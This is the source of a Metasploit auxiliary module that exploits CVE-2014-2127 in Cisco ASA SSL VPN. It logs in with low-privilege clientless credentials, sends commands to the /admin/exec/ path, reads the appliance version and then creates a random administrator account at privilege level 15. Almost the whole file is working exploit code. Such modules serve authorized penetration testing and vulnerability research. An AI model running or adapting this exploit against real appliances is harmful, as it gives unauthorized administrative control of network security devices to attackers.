##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  attr_accessor :ssh_socket

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
      'Description' => %q{
        This module exploits a privilege escalation vulnerability for Cisco
        ASA SSL VPN (aka: WebVPN).  It allows level 0 users to escalate to
        level 15.
      },
      'Author'       =>
        [
          'jclaudius <jclaudius[at]trustwave.com>',
          'lguay <laura.r.guay[at]gmail.com'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-2127'],
          ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
          ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
        ],
      'DisclosureDate' => 'Apr 09 2014'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'clientless']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'clientless']),
        OptString.new('GROUP', [true, "A specific VPN group to use", 'clientless']),
        OptInt.new('RETRIES', [true, 'The number of exploit attempts to make', 10])
      ], self.class
    )

  end

  def validate_cisco_ssl_vpn
    begin
      res = send_request_cgi(
              'uri' => '/',
              'method' => 'GET'
            )

      vprint_good("#{peer} - Server is responsive")
    rescue ::Rex::ConnectionError, ::Errno::EPIPE
      return false
    end

    res = send_request_cgi(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET'
          )

    if res &&
       res.code == 302

      res = send_request_cgi(
              'uri' => '/+CSCOE+/logon.html',
              'method' => 'GET',
              'vars_get' => { 'fcadbadd' => "1" }
            )
    end

    if res &&
       res.code == 200 &&
       res.body.include?('webvpnlogin')
      return true
    else
      return false
    end
  end

  def do_logout(cookie)
    res = send_request_cgi(
            'uri' => '/+webvpn+/webvpn_logout.html',
            'method' => 'GET',
            'cookie' => cookie
          )

    if res &&
       res.code == 200
      vprint_good("#{peer} - Logged out")
    end
  end

  def run_command(cmd, cookie)
    reformatted_cmd = cmd.split(" ").join("+")

    res = send_request_cgi(
            'uri'       => "/admin/exec/#{reformatted_cmd}",
            'method'    => 'GET',
            'cookie'    => cookie
          )

    res
  end

  def do_show_version(cookie, tries = 3)
    # Make up to three attempts because server can be a little flaky
    tries.times do |i|
      command = "show version"
      resp = run_command(command, cookie)

      if resp &&
         resp.body.include?('Cisco Adaptive Security Appliance Software Version')
        return resp.body
      else
        vprint_error("#{peer} - Unable to run '#{command}'")
        vprint_good("#{peer} - Retrying #{i} '#{command}'") unless i == 2
      end
    end

    return nil
  end

  def add_user(cookie, tries = 3)
    username = random_username
    password = random_password

    tries.times do |i|
      vprint_good("#{peer} - Attemping to add User: #{username}, Pass: #{password}")
      command = "username #{username} password #{password} privilege 15"
      resp = run_command(command, cookie)

      if resp &&
         !resp.body.include?('Command authorization failed') &&
         !resp.body.include?('Command failed')
        vprint_good("#{peer} - Privilege Escalation Appeared Successful")
        return [username, password]
      else
        vprint_error("#{peer} - Unable to run '#{command}'")
        vprint_good("#{peer} - Retrying #{i} '#{command}'") unless i == tries - 1
      end
    end

    return nil
  end

  # Generates a random password of arbitrary length
  def random_password(length = 20)
    char_array = [('a'..'z'), ('A'..'Z'), ('0'..'9')].map { |i| i.to_a }.flatten
    (0...length).map { char_array[rand(char_array.length)] }.join
  end

  # Generates a random username of arbitrary length
  def random_username(length = 8)
    char_array = [('a'..'z')].map { |i| i.to_a }.flatten
    (0...length).map { char_array[rand(char_array.length)] }.join
  end

  def do_login(user, pass, group)
    begin
      cookie = "webvpn=; " +
               "webvpnc=; " +
               "webvpn_portal=; " +
               "webvpnSharePoint=; " +
               "webvpnlogin=1; " +
               "webvpnLang=en;"

      post_params = {
        'tgroup' => '',
        'next' => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login' => 'Logon'
      }

      post_params['group_list'] = group unless group.empty?

      resp = send_request_cgi(
              'uri' => '/+webvpn+/index.html',
              'method'    => 'POST',
              'ctype'     => 'application/x-www-form-urlencoded',
              'cookie'    => cookie,
              'vars_post' => post_params
            )

      if resp &&
         resp.code == 200 &&
         resp.body.include?('SSL VPN Service') &&
         resp.body.include?('webvpn_logout')

        vprint_good("#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
        return resp.get_cookies
      else
        return false
      end

    rescue ::Rex::ConnectionError, ::Errno::EPIPE
      return false
    end
  end

  def run_host(ip)
    # Validate we're dealing with Cisco SSL VPN
    unless validate_cisco_ssl_vpn
      vprint_error("#{peer} - Does not appear to be Cisco SSL VPN")
      :abort
    end

    # This is crude, but I've found this to be somewhat
    # interimittent based on session, so we'll just retry
    # 'X' times.
    datastore['RETRIES'].times do |i|
      vprint_good("#{peer} - Exploit Attempt ##{i}")

      # Authenticate to SSL VPN and get session cookie
      cookie = do_login(
                 datastore['USERNAME'],
                 datastore['PASSWORD'],
                 datastore['GROUP']
               )

      # See if our authentication attempt failed
      unless cookie
        vprint_error("#{peer} - Failed to login to Cisco SSL VPN")
        next
      end

      # Grab version
      version = do_show_version(cookie)

      if version &&
         version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
        print_good("#{peer} - Show version succeeded. Version is Cisco ASA #{version_match[1]}")
      else
        do_logout(cookie)
        vprint_error("#{peer} - Show version failed")
        next
      end

      # Attempt to add an admin user
      creds = add_user(cookie)
      do_logout(cookie)

      if creds
        print_good("#{peer} - Successfully added level 15 account #{creds.join(", ")}")

        user, pass = creds

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'Cisco ASA SSL VPN Privilege Escalation',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'
        }

        report_auth_info(report_hash)
      else
        vprint_error("#{peer} - Failed to created user account on Cisco SSL VPN")
      end
    end
  end

end
